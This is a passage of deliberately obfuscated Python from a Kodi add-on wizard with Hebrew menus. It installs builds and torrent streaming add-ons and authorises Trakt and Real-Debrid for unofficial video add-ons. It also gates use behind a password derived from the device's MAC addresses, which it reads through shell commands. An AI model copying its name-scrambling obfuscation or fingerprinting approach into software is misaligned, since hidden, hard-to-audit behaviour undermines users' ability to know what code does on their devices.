							O00OO0O00O0OOO0OO =O00OO0O00O0OOO0OO [1 :O00OO0O00O0OOO0OO .rfind (OO00O00OOO0OO0OOO )]#line:1714
					else :#line:1715
						if O00OO0O00O0OOO0OO .find (" ")>0 :#line:1716
							O00OO0O00O0OOO0OO =O00OO0O00O0OOO0OO [:O00OO0O00O0OOO0OO .find (" ")]#line:1717
						elif O00OO0O00O0OOO0OO .find ("/")>0 :#line:1718
							O00OO0O00O0OOO0OO =O00OO0O00O0OOO0OO [:O00OO0O00O0OOO0OO .find ("/")]#line:1719
						elif O00OO0O00O0OOO0OO .find (">")>0 :#line:1720
							O00OO0O00O0OOO0OO =O00OO0O00O0OOO0OO [:O00OO0O00O0OOO0OO .find (">")]#line:1721
					OOO0OO0OOOO00O0OO .append (O00OO0O00O0OOO0OO .strip ())#line:1723
			OO0OO000OOOO000O0 =OOO0OO0OOOO00O0OO #line:1724
		else :#line:1725
			OOO0OO0OOOO00O0OO =[]#line:1726
			for O0OOOOO0O00OO0OO0 in OO0OO000OOOO000O0 :#line:1727
				OOOO000O000O00O00 =u"</"+name #line:1728
				O0000000OOOOOOO0O =OOO00000OOO00O0OO .find (O0OOOOO0O00OO0OO0 )#line:1730
				OO0000O0O0O00O00O =OOO00000OOO00O0OO .find (OOOO000O000O00O00 ,O0000000OOOOOOO0O )#line:1731
				O00OOO0000O0OOOOO =OOO00000OOO00O0OO .find ("<"+name ,O0000000OOOOOOO0O +1 )#line:1732
				while O00OOO0000O0OOOOO <OO0000O0O0O00O00O and O00OOO0000O0OOOOO !=-1 :#line:1734
					O0OO00O0OOO0000OO =OOO00000OOO00O0OO .find (OOOO000O000O00O00 ,OO0000O0O0O00O00O +len (OOOO000O000O00O00 ))#line:1735
					if O0OO00O0OOO0000OO !=-1 :#line:1736
						OO0000O0O0O00O00O =O0OO00O0OOO0000OO #line:1737
					O00OOO0000O0OOOOO =OOO00000OOO00O0OO .find ("<"+name ,O00OOO0000O0OOOOO +1 )#line:1738
				if O0000000OOOOOOO0O ==-1 and OO0000O0O0O00O00O ==-1 :#line:1740
					OOOO00OO0OO0O00OO =u""#line:1741
				elif O0000000OOOOOOO0O >-1 and OO0000O0O0O00O00O >-1 :#line:1742
					OOOO00OO0OO0O00OO =OOO00000OOO00O0OO [O0000000OOOOOOO0O +len (O0OOOOO0O00OO0OO0 ):OO0000O0O0O00O00O ]#line:1743
				elif OO0000O0O0O00O00O >-1 :#line:1744
					OOOO00OO0OO0O00OO =OOO00000OOO00O0OO [:OO0000O0O0O00O00O ]#line:1745
				elif O0000000OOOOOOO0O >-1 :#line:1746
					OOOO00OO0OO0O00OO =OOO00000OOO00O0OO [O0000000OOOOOOO0O +len (O0OOOOO0O00OO0OO0 ):]#line:1747
				if ret :#line:1749
					OOOO000O000O00O00 =OOO00000OOO00O0OO [OO0000O0O0O00O00O :OOO00000OOO00O0OO .find (">",OOO00000OOO00O0OO .find (OOOO000O000O00O00 ))+1 ]#line:1750
					OOOO00OO0OO0O00OO =O0OOOOO0O00OO0OO0 +OOOO00OO0OO0O00OO +OOOO000O000O00O00 #line:1751
				OOO00000OOO00O0OO =OOO00000OOO00O0OO [OOO00000OOO00O0OO .find (OOOO00OO0OO0O00OO ,OOO00000OOO00O0OO .find (O0OOOOO0O00OO0OO0 ))+len (OOOO00OO0OO0O00OO ):]#line:1753
				OOO0OO0OOOO00O0OO .append (OOOO00OO0OO0O00OO )#line:1754
			OO0OO000OOOO000O0 =OOO0OO0OOOO00O0OO #line:1755
		OOOO00OO00O000OO0 +=OO0OO000OOOO000O0 #line:1756
	return OOOO00OO00O000OO0 #line:1758
def addItem (OO00O00O0O000O0O0 ,O0OO00O0O0OO0O000 ,O0OO00OOO0O0000OO ,OOO0O0OO000O0O0OO ,OOOOO00O00O0000OO ,description =None ):#line:1760
	if description ==None :description =''#line:1761
	description ='[COLOR white]'+description +'[/COLOR]'#line:1762
	OOOOOO0O0000O0O0O =sys .argv [0 ]+"?url="+urllib .quote_plus (O0OO00O0O0OO0O000 )+"&mode="+str (O0OO00OOO0O0000OO )+"&name="+urllib .quote_plus (OO00O00O0O000O0O0 )+"&iconimage="+urllib .quote_plus (OOO0O0OO000O0O0OO )+"&fanart="+urllib .quote_plus (OOOOO00O00O0000OO )#line:1763
	OO0O000OO0OOOO0O0 =True #line:1764
	O0000OO0OO0O0000O =xbmcgui .ListItem (OO00O00O0O000O0O0 ,iconImage =OOO0O0OO000O0O0OO ,thumbnailImage =OOO0O0OO000O0O0OO )#line:1765
	O0000OO0OO0O0000O .setInfo (type ="Video",infoLabels ={"Title":OO00O00O0O000O0O0 ,"Plot":description })#line:1766
	O0000OO0OO0O0000O .setProperty ("fanart_Image",OOOOO00O00O0000OO )#line:1767
	O0000OO0OO0O0000O .setProperty ("icon_Image",OOO0O0OO000O0O0OO )#line:1768
	OO0O000OO0OOOO0O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOOOO0O0000O0O0O ,listitem =O0000OO0OO0O0000O ,isFolder =False )#line:1769
	return OO0O000OO0OOOO0O0 #line:1770
def get_params ():#line:1772
		O00OO00OOOOOO0OO0 =[]#line:1773
		O0O0OOOOO0000O000 =sys .argv [2 ]#line:1774
		if len (O0O0OOOOO0000O000 )>=2 :#line:1775
				OOO00O0OO0O0O00OO =sys .argv [2 ]#line:1776
				O0OO000OO0OO00000 =OOO00O0OO0O0O00OO .replace ('?','')#line:1777
				if (OOO00O0OO0O0O00OO [len (OOO00O0OO0O0O00OO )-1 ]=='/'):#line:1778
						OOO00O0OO0O0O00OO =OOO00O0OO0O0O00OO [0 :len (OOO00O0OO0O0O00OO )-2 ]#line:1779
				OO0OO0O0OO00O0OO0 =O0OO000OO0OO00000 .split ('&')#line:1780
				O00OO00OOOOOO0OO0 ={}#line:1781
				for OOOOO000OO0OO0OO0 in range (len (OO0OO0O0OO00O0OO0 )):#line:1782
						OO0O0000O000O0OOO ={}#line:1783
						OO0O0000O000O0OOO =OO0OO0O0OO00O0OO0 [OOOOO000OO0OO0OO0 ].split ('=')#line:1784
						if (len (OO0O0000O000O0OOO ))==2 :#line:1785
								O00OO00OOOOOO0OO0 [OO0O0000O000O0OOO [0 ]]=OO0O0000O000O0OOO [1 ]#line:1786
		return O00OO00OOOOOO0OO0 #line:1788
def decode (O0OOO0OO0000O0OOO ,OOOOOOOO0O00O0000 ):#line:1793
    import base64 #line:1794
    O00O0000O00OO0O00 =[]#line:1795
    if (len (O0OOO0OO0000O0OOO ))!=4 :#line:1797
     return 10 #line:1798
    OOOOOOOO0O00O0000 =base64 .urlsafe_b64decode (OOOOOOOO0O00O0000 )#line:1799
    for O0O0O0O0O0O0O0O00 in range (len (OOOOOOOO0O00O0000 )):#line:1801
        O0O0O0000O0O0OOOO =O0OOO0OO0000O0OOO [O0O0O0O0O0O0O0O00 %len (O0OOO0OO0000O0OOO )]#line:1802
        OOO00OOOO00O0O000 =chr ((256 +ord (OOOOOOOO0O00O0000 [O0O0O0O0O0O0O0O00 ])-ord (O0O0O0000O0O0OOOO ))%256 )#line:1803
        O00O0000O00OO0O00 .append (OOO00OOOO00O0O000 )#line:1804
    return "".join (O00O0000O00OO0O00 )#line:1805
def tmdb_list (O00OO00O0O000O00O ):#line:1806
    OOO00OOOO0OO00OOO =decode ("7643",O00OO00O0O000O00O )#line:1809
    return int (OOO00OOOO0OO00OOO )#line:1812
def u_list (OOOOOOOO0O00OO0O0 ):#line:1813
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1815
        from math import sqrt #line:1816
        OO0O0000000OO000O =tmdb_list (TMDB_NEW_API )#line:1817
        OO00O00O0O0OOOO0O =str ((getHwAddr ('eth0'))*OO0O0000000OO000O )#line:1819
        OOOOO00000OOOO0OO =int (OO00O00O0O0OOOO0O [1 ]+OO00O00O0O0OOOO0O [2 ]+OO00O00O0O0OOOO0O [5 ]+OO00O00O0O0OOOO0O [7 ])#line:1820
        O000O0OOO00O0OOOO =(ADDON .getSetting ("pass"))#line:1822
        OOOOOO0OOOOO00O0O =(str (round (sqrt ((OOOOO00000OOOO0OO *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1827
        if '.'in OOOOOO0OOOOO00O0O :#line:1829
         OOOOOO0OOOOO00O0O =(str (round (sqrt ((OOOOO00000OOOO0OO *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1830
        if O000O0OOO00O0OOOO ==OOOOOO0OOOOO00O0O :#line:1832
          O0O000O0OOOO0O0O0 =OOOOOOOO0O00OO0O0 #line:1834
        else :#line:1836
           if STARTP2 ()and STARTP ()=='ok':#line:1837
             return OOOOOOOO0O00OO0O0 #line:1840
           O0O000O0OOOO0O0O0 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1841
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1842
           sys .exit ()#line:1843
        return O0O000O0OOOO0O0O0 #line:1844
    else :#line:1845
        STARTP ()#line:1846
def disply_hwr ():#line:1850
   try :#line:1851
    O0O000O00O0O0OOOO =tmdb_list (TMDB_NEW_API )#line:1852
    OOO0O0O0O0O0O0OOO =str ((getHwAddr ('eth0'))*O0O000O00O0O0OOOO )#line:1853
    OO0O0O00OO0O0OOOO =(OOO0O0O0O0O0O0OOO [1 ]+OOO0O0O0O0O0O0OOO [2 ]+OOO0O0O0O0O0O0OOO [5 ]+OOO0O0O0O0O0O0OOO [7 ])#line:1860
    OOO0OOOOOOOOO000O =(ADDON .getSetting ("action"))#line:1861
    wiz .setS ('action',str (OO0O0O00OO0O0OOOO ))#line:1863
   except :pass #line:1864
def disply_hwr2 ():#line:1865
   try :#line:1866
    O00OO0O0O0O0OO000 =tmdb_list (TMDB_NEW_API )#line:1867
    OO0OO0OOOO00O0OOO =str ((getHwAddr ('eth0'))*O00OO0O0O0O0OO000 )#line:1869
    OOO000OO0O0O00O0O =(OO0OO0OOOO00O0OOO [1 ]+OO0OO0OOOO00O0OOO [2 ]+OO0OO0OOOO00O0OOO [5 ]+OO0OO0OOOO00O0OOO [7 ])#line:1878
    OO0O0O0OO0O00O0O0 =(ADDON .getSetting ("action"))#line:1879
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OOO000OO0O0O00O0O )#line:1882
   except :pass #line:1883
def getHwAddr (O00OOOOOOOOOOOO0O ):#line:1885
   import subprocess ,time #line:1886
   O0O0000O000O00O0O ='windows'#line:1887
   if xbmc .getCondVisibility ('system.platform.android'):#line:1888
       O0O0000O000O00O0O ='android'#line:1889
   if xbmc .getCondVisibility ('system.platform.android'):#line:1890
     O00000O00O0OO00O0 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1891
     O000O0O0O0O0OOOO0 =re .compile ('link/ether (.+?) brd').findall (str (O00000O00O0OO00O0 ))#line:1893
     OOO0OOOO0OOOO00OO =0 #line:1894
     for OOOOO0OOO0O0OOOO0 in O000O0O0O0O0OOOO0 :#line:1895
      if O000O0O0O0O0OOOO0 !='00:00:00:00:00:00':#line:1896
          O0O00OOO0OOOOOOOO =OOOOO0OOO0O0OOOO0 #line:1897
          OOO0OOOO0OOOO00OO =OOO0OOOO0OOOO00OO +int (O0O00OOO0OOOOOOOO .replace (':',''),16 )#line:1898
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1900
       OOO0OO0O0000O0O00 =0 #line:1901
       OOO0OOOO0OOOO00OO =0 #line:1902
       OOO0O00OOOOO0OO00 =[]#line:1903
       OO00000O0OOOOO0OO =os .popen ("getmac").read ()#line:1904
       OO00000O0OOOOO0OO =OO00000O0OOOOO0OO .split ("\n")#line:1905
       for O000O0OO0O0OOO000 in OO00000O0OOOOO0OO :#line:1907
            O0O00O0000O00O00O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O000O0OO0O0OOO000 ,re .I )#line:1908
            if O0O00O0000O00O00O :#line:1909
                O000O0O0O0O0OOOO0 =O0O00O0000O00O00O .group ().replace ('-',':')#line:1910
                OOO0O00OOOOO0OO00 .append (O000O0O0O0O0OOOO0 )#line:1911
                OOO0OOOO0OOOO00OO =OOO0OOOO0OOOO00OO +int (O000O0O0O0O0OOOO0 .replace (':',''),16 )#line:1914
   else :#line:1916
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1917
   try :#line:1934
    return OOO0OOOO0OOOO00OO #line:1935
   except :pass #line:1936
def getpass ():#line:1937
	disply_hwr2 ()#line:1939
def setpass ():#line:1940
    OOOOO00OO00O0O0O0 =xbmcgui .Dialog ()#line:1941
    OOOOOOO0O000O0OOO =''#line:1942
    OO0OO0OOOOOOO0000 =xbmc .Keyboard (OOOOOOO0O000O0OOO ,'הכנס סיסמה')#line:1944
    OO0OO0OOOOOOO0000 .doModal ()#line:1945
    if OO0OO0OOOOOOO0000 .isConfirmed ():#line:1946
           OO0OO0OOOOOOO0000 =OO0OO0OOOOOOO0000 .getText ()#line:1947
    wiz .setS ('pass',str (OO0OO0OOOOOOO0000 ))#line:1948
def setuname ():#line:1949
    O0OO00O0O0O0O00OO =''#line:1950
    O000O00OO00OO0OOO =xbmc .Keyboard (O0OO00O0O0O0O00OO ,'הכנס שם משתמש')#line:1951
    O000O00OO00OO0OOO .doModal ()#line:1952
    if O000O00OO00OO0OOO .isConfirmed ():#line:1953
           O0OO00O0O0O0O00OO =O000O00OO00OO0OOO .getText ()#line:1954
           wiz .setS ('user',str (O0OO00O0O0O0O00OO ))#line:1955
def powerkodi ():#line:1956
    os ._exit (1 )#line:1957
def buffer1 ():#line:1959
	OO0OO00OO00000OOO =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1960
	O0000O00000O0OO0O =xbmc .getInfoLabel ("System.Memory(total)")#line:1961
	OO000OO00O0O0O0OO =xbmc .getInfoLabel ("System.FreeMemory")#line:1962
	O0OOO00OOO00OOOO0 =re .sub ('[^0-9]','',OO000OO00O0O0O0OO )#line:1963
	O0OOO00OOO00OOOO0 =int (O0OOO00OOO00OOOO0 )/3 #line:1964
	OO0O000OO0OOO0OO0 =O0OOO00OOO00OOOO0 *1024 *1024 #line:1965
	try :O0O0O00O0O0OO00OO =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1966
	except :O0O0O00O0O0OO00OO =16 #line:1967
	OOOOO0O00OOOOO000 =DIALOG .yesno ('FREE MEMORY: '+str (OO000OO00O0O0O0OO ),'Based on your free Memory your optimal buffersize is: '+str (O0OOO00OOO00OOOO0 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1970
	if OOOOO0O00OOOOO000 ==1 :#line:1971
		with open (OO0OO00OO00000OOO ,"w")as O0OOO00O00000O0OO :#line:1972
			if O0O0O00O0O0OO00OO >=17 :O00OO0O000OOOOO0O =xml_data_advSettings_New (str (OO0O000OO0OOO0OO0 ))#line:1973
			else :O00OO0O000OOOOO0O =xml_data_advSettings_old (str (OO0O000OO0OOO0OO0 ))#line:1974
			O0OOO00O00000O0OO .write (O00OO0O000OOOOO0O )#line:1976
			DIALOG .ok ('Buffer Size Set to: '+str (OO0O000OO0OOO0OO0 ),'Please restart Kodi for settings to apply.','')#line:1977
	elif OOOOO0O00OOOOO000 ==0 :#line:1979
		OO0O000OO0OOO0OO0 =_O00O000O0OO0000OO (default =str (OO0O000OO0OOO0OO0 ),heading ="INPUT BUFFER SIZE")#line:1980
		with open (OO0OO00OO00000OOO ,"w")as O0OOO00O00000O0OO :#line:1981
			if O0O0O00O0O0OO00OO >=17 :O00OO0O000OOOOO0O =xml_data_advSettings_New (str (OO0O000OO0OOO0OO0 ))#line:1982
			else :O00OO0O000OOOOO0O =xml_data_advSettings_old (str (OO0O000OO0OOO0OO0 ))#line:1983
			O0OOO00O00000O0OO .write (O00OO0O000OOOOO0O )#line:1984
			DIALOG .ok ('Buffer Size Set to: '+str (OO0O000OO0OOO0OO0 ),'Please restart Kodi for settings to apply.','')#line:1985
def xml_data_advSettings_old (OOO00O00O0OO000O0 ):#line:1986
	O000000O0OO000O00 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OOO00O00O0OO000O0 #line:1996
	return O000000O0OO000O00 #line:1997
def xml_data_advSettings_New (O000O0OOO0O0O00OO ):#line:1999
	OOOOOOOOO0000O000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O000O0OOO0O0O00OO #line:2011
	return OOOOOOOOO0000O000 #line:2012
def write_ADV_SETTINGS_XML (OOO0O0OOO000OOO00 ):#line:2013
    if not os .path .exists (xml_file ):#line:2014
        with open (xml_file ,"w")as O0OO000OOOO0O0000 :#line:2015
            O0OO000OOOO0O0000 .write (xml_data )#line:2016
def _O00O000O0OO0000OO (default ="",heading ="",hidden =False ):#line:2017
    ""#line:2018
    O0O0O0O000OO00000 =xbmc .Keyboard (default ,heading ,hidden )#line:2019
    O0O0O0O000OO00000 .doModal ()#line:2020
    if (O0O0O0O000OO00000 .isConfirmed ()):#line:2021
        return unicode (O0O0O0O000OO00000 .getText (),"utf-8")#line:2022
    return default #line:2023
def index ():#line:2025
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2026
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2027
	if AUTOUPDATE =='Yes':#line:2028
		if wiz .workingURL (WIZARDFILE )==True :#line:2029
			OOO0OOOOO0000OO00 =wiz .checkWizard ('version')#line:2030
			if OOO0OOOOO0000OO00 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OOO0OOOOO0000OO00 ),'wizardupdate',themeit =THEME2 )#line:2031
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2032
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2033
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2034
	if len (BUILDNAME )>0 :#line:2035
		OO0000OOOOOOO00O0 =wiz .checkBuild (BUILDNAME ,'version')#line:2036
		O00O0OOO000O0O0OO ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2037
		if OO0000OOOOOOO00O0 >BUILDVERSION :O00O0OOO000O0O0OO ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O00O0OOO000O0O0OO ,OO0000OOOOOOO00O0 )#line:2038
		addDir (O00O0OOO000O0O0OO ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2040
		try :#line:2042
		     OOO0OOO0OO0O0OO0O =wiz .themeCount (BUILDNAME )#line:2043
		except :#line:2044
		   OOO0OOO0OO0O0OO0O =False #line:2045
		if not OOO0OOO0OO0O0OO0O ==False :#line:2046
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2047
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2048
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2051
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2052
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2053
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2057
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2059
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2061
def morsetup ():#line:2063
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2064
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2065
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2066
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2067
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2068
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2072
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2073
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2076
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2077
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2087
	setView ('files','viewType')#line:2088
def morsetup2 ():#line:2089
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2090
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2091
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2092
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2096
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2097
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2098
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2099
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2100
def fastupdate ():#line:2101
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2102
def forcefastupdate ():#line:2104
			O0O0OO0OO00OO00OO ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2105
			wiz .ForceFastUpDate (ADDONTITLE ,O0O0OO0OO00OO00OO )#line:2106
def rdsetup ():#line:2110
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2111
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2112
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2114
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2115
def traktsetup ():#line:2118
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2119
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2120
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2121
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2122
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2123
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2124
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2125
	setView ('files','viewType')#line:2126
def setautorealdebrid ():#line:2127
    from resources .libs import real_debrid #line:2128
    O000O0OOO00OOO0OO =real_debrid .RealDebridFirst ()#line:2129
    O000O0OOO00OOO0OO .auth ()#line:2130
def setrealdebrid ():#line:2132
    OO00000000O0OO0OO =(ADDON .getSetting ("auto_rd"))#line:2133
    if OO00000000O0OO0OO =='false':#line:2134
       ADDON .openSettings ()#line:2135
    else :#line:2136
        from resources .libs import real_debrid #line:2137
        OOOO0OOOOO0OO000O =real_debrid .RealDebrid ()#line:2138
        OOOO0OOOOO0OO000O .auth ()#line:2139
        rdon ()#line:2142
def resolveurlsetup ():#line:2144
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2145
def urlresolversetup ():#line:2146
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2147
def placentasetup ():#line:2149
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2150
def reptiliasetup ():#line:2151
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2152
def flixnetsetup ():#line:2153
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2154
def yodasetup ():#line:2155
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2156
def numberssetup ():#line:2157
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2158
def uranussetup ():#line:2159
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2160
def genesissetup ():#line:2161
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2162
def net_tools (view =None ):#line:2164
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2165
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2166
	setView ('files','viewType')#line:2168
def speedMenu ():#line:2169
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2170
def viewIP ():#line:2171
	OO00OOO0O00O00OOO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2185
	O00OOO0OOO00O0OOO =[];OO000OO00OO000O0O =0 #line:2186
	for O000O00O000O00000 in OO00OOO0O00O00OOO :#line:2187
		O0OO0OO0OO00OO000 =wiz .getInfo (O000O00O000O00000 )#line:2188
		O0O0OOO0OOO0O00O0 =0 #line:2189
		while O0OO0OO0OO00OO000 =="Busy"and O0O0OOO0OOO0O00O0 <10 :#line:2190
			O0OO0OO0OO00OO000 =wiz .getInfo (O000O00O000O00000 );O0O0OOO0OOO0O00O0 +=1 ;wiz .log ("%s sleep %s"%(O000O00O000O00000 ,str (O0O0OOO0OOO0O00O0 )));xbmc .sleep (1000 )#line:2191
		O00OOO0OOO00O0OOO .append (O0OO0OO0OO00OO000 )#line:2192
		OO000OO00OO000O0O +=1 #line:2193
	OOO0000O0OOO0000O ,O00OOOOO00O0OOOOO ,OOO00OOOO00OOOOO0 =getIP ()#line:2194
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOO0OOO00O0OOO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2195
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0000O0OOO0000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2196
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOO00O0OOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2197
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OOOO00OOOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2198
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOO0OOO00O0OOO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2199
	setView ('files','viewType')#line:2200
def buildMenu ():#line:2202
	if USERNAME =='':#line:2203
		ADDON .openSettings ()#line:2204
		sys .exit ()#line:2205
	if PASSWORD =='':#line:2206
		ADDON .openSettings ()#line:2207
	O00OOO00O0O0000O0 =u_list (SPEEDFILE )#line:2208
